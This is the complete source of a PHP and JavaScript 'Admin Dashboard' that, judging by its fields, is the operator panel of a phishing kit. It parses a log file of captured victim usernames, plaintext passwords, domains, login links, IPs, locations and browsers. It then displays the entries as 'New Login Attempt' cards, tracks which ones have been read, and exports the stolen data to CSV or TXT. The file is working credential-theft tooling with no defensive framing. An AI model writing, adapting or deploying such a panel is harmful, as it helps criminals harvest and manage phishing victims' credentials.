<?php
session_start();
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: login.php");
    exit;
}

$filename = "alldata.txt";
$grouped  = [];

/* Parse logs */
if (file_exists($filename)) {
    $content   = file_get_contents($filename);
    $raw_logs  = explode("==========: || Login Audit Logs 2025 || :==========", $content);

    foreach ($raw_logs as $raw) {
        $raw = trim($raw);
        if (!$raw) continue;

        $lines = explode("\n", $raw);
        $entry = [];

        foreach ($lines as $line) {
            [$label, $value] = array_map('trim', explode(':', $line, 2)) + [null, null];
            if (!$label || !$value) continue;

            if (stripos($label, 'UserName')    !== false) $entry['User']    = $value;
            if (stripos($label, 'PassWord')    !== false) $entry['Pass']    = $value;
            if (stripos($label, 'Domain')      !== false) $entry['Domain']  = $value;
            if (stripos($label, 'Sender')      !== false) $entry['Sender']  = $value;
            if (stripos($label, 'Login Link')  !== false) $entry['Link']    = $value;
            if (stripos($label, 'Users IP')    !== false) $entry['IP']      = $value;
            if (stripos($label, 'Country')     !== false) $entry['Country'] = $value;
            if (stripos($label, 'Region')      !== false) $entry['Region']  = $value;
            if (stripos($label, 'Browser')     !== false) $entry['Browser'] = $value;
            if (stripos($label, 'Date')        !== false) $entry['Date']    = $value;
        }

        if (!empty($entry['IP'])) {
            $grouped[$entry['IP']][] = $entry;
        }
    }
}

/* Sort logs */
foreach ($grouped as &$entries) {
    usort($entries, fn($a, $b) => strtotime($b['Date']) - strtotime($a['Date']));
}
unset($entries);

uksort($grouped, function ($a, $b) use ($grouped) {
    $latestA = strtotime($grouped[$a][0]['Date'] ?? '0');
    $latestB = strtotime($grouped[$b][0]['Date'] ?? '0');
    return $latestB - $latestA;
});

$totalLogs = array_sum(array_map('count', $grouped));
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Admin Dashboard</title>
<link rel="icon" type="image/png" href="img/ico.png" />
<style>
body {
  font-family: Arial, sans-serif;
  background: #f2f2f2;
  padding: 30px;
}
.container {
  max-width: 820px;
  margin: 0 auto;
  padding: 0 10px;
}
.header-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.page-title {
  flex: 1;
  text-align: center;
  font-size: 24px;
  margin: 0;
}
.controls {
  text-align: center;
  margin-bottom: 10px;
}
.controls button {
  padding: 10px 20px;
  margin: 5px;
}
.controls label {
  margin-left: 10px;
  font-size: 15px;
}
.status-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin: 10px auto 20px;
  font-size: 16px;
  color: #333;
  width: 90%;
  gap: 10px;
}
#searchInput {
  flex: 1;
  max-width: 300px;
  padding: 8px 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
}
.top-right {
  font-size: 14px;
  white-space: nowrap;
}
.logout-btn {
  text-decoration: none;
  background: #007bff;
  color: #fff;
  padding: 4px 8px;
  border-radius: 4px;
  margin-left: 10px;
}
.card {
  background: #fff;
  margin: 10px auto;
  max-width: 800px;
  border: 1px solid #007bff;
  border-radius: 8px;
  overflow: hidden;
}
.card-header {
  display: grid;
  grid-template-columns: auto 1fr auto;
  align-items: center;
  padding: 15px;
  font-weight: bold;
}
.card.read .card-header {
  background: #F2F6FC;
}
.card.unread .card-header {
  background: #ffffff;
}
.center-info {
  text-align: center;
}
.card-body {
  display: none;
  padding: 15px;
  border-top: 1px solid #ccc;
  background: #fff;
}
.pagination {
  text-align: center;
  margin: 20px 0;
}
.pagination button {
  padding: 5px 10px;
  margin: 0 5px;
}
</style>
</head>
<body>
<div class="container">
  <div class="header-bar">
    <div style="width:120px;"></div>
    <h2 class="page-title">Welcome to my Admin Dashboard</h2>
    <div style="width:120px;"></div>
  </div>

  <div class="controls">
    <button onclick="exportCSV()">Export CSV</button>
    <button onclick="exportTXT()">Export TXT</button>
    <button onclick="location.reload()">Manual Refresh</button>
    <label><input type="checkbox" id="unreadOnly" onchange="filterLogs()"> Show Unread Only</label>
  </div>

  <div class="status-container">
    <div id="statusBar">Unread – of Total Logs:</div>
    <input type="text" id="searchInput" placeholder="Search logs..." onkeyup="filterLogs()" />
    <div class="top-right">
      Logged in as <strong><?= htmlspecialchars($_SESSION['username']) ?></strong>
      | <a href="logout.php" class="logout-btn">Logout</a>
    </div>
  </div>

  <div id="logContainer"></div>
  <div class="pagination" id="pagination"></div>
</div>

<script>
const logs        = <?= json_encode($grouped, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;
const totalLogs   = <?= $totalLogs ?>;
const logsPerPage = 100;
let currentPage   = 1;
let filteredIPs   = Object.keys(logs);

function paginate() {
  const container = document.getElementById('logContainer');
  const pag = document.getElementById('pagination');
  container.innerHTML = '';
  pag.innerHTML = '';

  const totalPages = Math.ceil(filteredIPs.length / logsPerPage);
  const start = (currentPage - 1) * logsPerPage;
  const end = start + logsPerPage;
  const pageData = filteredIPs.slice(start, end);

  const read = JSON.parse(localStorage.getItem('readLogs') || '[]');

  pageData.forEach(ip => {
    const entries = logs[ip];
    const latest = entries[0];
    const sender = latest.Sender || 'Others';
    const lastSeenDate = read.find(r => r.ip === ip)?.date;
    const isRead = lastSeenDate && new Date(lastSeenDate) >= new Date(latest.Date);

    const card = document.createElement('div');
    card.className = 'card ' + (isRead ? 'read' : 'unread');
    card.dataset.ip = ip;

    const header = document.createElement('div');
    header.className = 'card-header';
    header.innerHTML = `
      <span class="left-info">(${entries.length}) ${sender}</span>
      <span class="center-info">New Login Attempt&nbsp;|&nbsp;${ip}</span>
      <span class="right-info">${latest.Date}</span>`;
    header.onclick = () => toggle(card, ip, latest.Date);

    const body = document.createElement('div');
    body.className = 'card-body';
    entries.forEach(log => {
      body.innerHTML += `<div>
        <strong>Username :</strong> ${log.User}<br>
        <strong>Password :</strong> ${log.Pass}<br>
        <strong>Domain :</strong> ${log.Domain}<br>
        <strong>Login Link :</strong> ${log.Link}<br>
        <strong>Client IP :</strong> ${ip}<br>
        <strong>Country :</strong> ${log.Country}<br>
        <strong>City :</strong> ${log.Region}<br>
        <strong>Date :</strong> ${log.Date}<br>
        <strong>Browser :</strong> ${log.Browser}
      </div><hr>`;
    });

    card.appendChild(header);
    card.appendChild(body);
    container.appendChild(card);
  });

  for (let i = 1; i <= totalPages; i++) {
    const btn = document.createElement('button');
    btn.textContent = i;
    btn.disabled = i === currentPage;
    btn.onclick = () => { currentPage = i; paginate(); };
    pag.appendChild(btn);
  }

  updateStatusBar();
}

function updateStatusBar() {
  const read = JSON.parse(localStorage.getItem('readLogs') || '[]');
  let unreadCount = 0;

  filteredIPs.forEach(ip => {
    const latest = logs[ip][0];
    const lastSeenDate = read.find(r => r.ip === ip)?.date;
    const isRead = lastSeenDate && new Date(lastSeenDate) >= new Date(latest.Date);
    if (!isRead) unreadCount++;
  });

  const from = ((currentPage - 1) * logsPerPage) + 1;
  const to = Math.min(from + logsPerPage - 1, filteredIPs.length);

  document.getElementById('statusBar').innerText =
    `Unread ${unreadCount} – ${to} of Total Logs: ${totalLogs}`;
}

function toggle(card, ip, date) {
  const body = card.querySelector('.card-body');
  const isOpen = body.style.display === 'block';
  document.querySelectorAll('.card-body').forEach(b => b.style.display = 'none');
  body.style.display = isOpen ? 'none' : 'block';
  if (!isOpen) markRead(card, ip, date);
}

function markRead(card, ip, date) {
  card.classList.remove('unread');
  card.classList.add('read');
  let read = JSON.parse(localStorage.getItem('readLogs') || '[]');
  const idx = read.findIndex(r => r.ip === ip);
  if (idx !== -1) read[idx].date = date;
  else read.push({ ip, date });
  localStorage.setItem('readLogs', JSON.stringify(read));
  updateStatusBar();
}

function filterLogs() {
  const term = document.getElementById('searchInput').value.toLowerCase();
  const unreadOnly = document.getElementById('unreadOnly').checked;
  const read = JSON.parse(localStorage.getItem('readLogs') || '[]');

  filteredIPs = Object.keys(logs).filter(ip => {
    const json = JSON.stringify(logs[ip]).toLowerCase();
    if (!(ip.toLowerCase().includes(term) || json.includes(term))) return false;
    if (!unreadOnly) return true;
    const latest = logs[ip][0];
    const lastSeenDate = read.find(r => r.ip === ip)?.date;
    return !(lastSeenDate && new Date(lastSeenDate) >= new Date(latest.Date));
  });

  currentPage = 1;
  paginate();
}

function exportCSV() {
  let csv = "Username,Password,Domain,Login Link,Client IP,Country,City,Date,Browser\n";
  Object.values(logs).flat().forEach(log => {
    csv += `${log.User},${log.Pass},${log.Domain},${log.Link},${log.IP},${log.Country},${log.Region},${log.Date},"${log.Browser}"\n`;
  });
  const blob = new Blob([csv], { type: 'text/csv' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = 'Download Logs.csv';
  a.click();
  URL.revokeObjectURL(url);
}

function exportTXT() {
  const a = document.createElement('a');
  a.href = '<?= $filename ?>';
  a.download = 'Download Logs.txt';
  a.click();
}

document.addEventListener('DOMContentLoaded', paginate);
</script>
</body>
</html>
